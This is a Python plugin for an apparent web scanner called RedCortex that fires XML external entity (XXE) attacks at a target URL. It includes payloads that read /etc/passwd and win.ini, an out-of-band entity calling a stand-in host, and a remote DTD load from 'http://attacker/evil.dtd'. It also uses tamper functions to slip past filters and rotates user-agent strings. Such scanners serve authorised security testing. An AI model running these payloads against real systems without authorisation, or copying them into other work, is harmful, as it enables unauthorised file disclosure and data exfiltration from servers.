"""
RedCortex Plugin: Advanced XXE Detection

Multiple XML payloads (external, parameter/tamper, OOB DNS), detects file leaks, error evidence, and DNS trigger by collaborator pattern.
"""

import requests, random, uuid, re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

XXE_PARAMS = [
    "xml", "doc", "data", "input", "upload", "request", "feed", "content", "payload", "value"
]

OOB_DNS = "xxe-demo.com"  # Change this to your Burp Collaborator/interactsh for real OOB XXE!
def random_oob():
    return f"http://{uuid.uuid4().hex}.{OOB_DNS}/"

XXE_PAYLOADS = [
    # Classic external entity, local file
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>""",
    # External with windows target
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
    <foo>&xxe;</foo>""",
    # OOB DNS (change domain for real hit)
    lambda: f"""<?xml version="1.0"?>
    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "{random_oob()}"> ]>
    <root>&xxe;</root>""",
    # Parameter entity
    """<?xml version="1.0"?>
    <!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
    %dtd; ]>"""
]

TAMPERS = [
    lambda x: x,
    lambda x: x.replace('xxe', 'x_xe'),
    lambda x: x.replace('SYSTEM', 'SYSTEM\t'),
    lambda x: x.replace('file://', 'FILE://'),
    lambda x: x.replace('\n', '').replace(' ', ''),
    lambda x: x.replace('>', ' >'),
    lambda x: x.replace('&xxe;', '&xxe;%00'),
]

XXE_EVIDENCE = [
    r"root:.*:0:0:",       # /etc/passwd
    r"\[extensions\]",     # win.ini
    r"entity.*not defined", 
    r"XML.*parse", 
    r"systemId",           # error msg
    r"OOB DNS",            # Fake OOB marker
    r"http[s]?:\/\/[a-z0-9\-]{32}\.xxe-demo\.com"
]

def send_req(url, xml_data):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/xml"
    }
    try:
        resp = requests.post(url, data=xml_data, headers=headers, timeout=12)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface; sends advanced/paranoid XXE payloads via POST/XML and checks leaks/errors/OOB evidence."""
    findings = []
    try:
        for tamper in TAMPERS:
            for pgen in XXE_PAYLOADS:
                payload = pgen() if callable(pgen) else pgen
                fuzzed = tamper(payload)
                print(f"[*] XXE inject: tamper {tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)} payload[abbrev]: '{fuzzed[:40]}...'")
                sc, body = send_req(url, fuzzed)
                if sc == 200 or (sc and sc >= 400):
                    # Evidence by local file/database error pattern
                    for patt in XXE_EVIDENCE:
                        if re.search(patt, body, re.IGNORECASE):
                            findings.append({
                                "type": "XXE",
                                "description": f"XXE evidence, payload (tamper '{tamper}'): <see evidence>",
                                "payload": fuzzed,
                                "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                "severity": "critical",
                                "url": url,
                                "evidence": re.findall(patt, body, re.IGNORECASE)
                            })
                            return findings
                    # Out-of-band XXE: marker leak in body
                    if OOB_DNS in body:
                        findings.append({
                            "type": "XXE",
                            "description": "OOB XXE detected, external entity reflected in response",
                            "payload": fuzzed,
                            "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                            "severity": "critical",
                            "url": url,
                            "evidence": OOB_DNS
                        })
                        return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings
    return findings
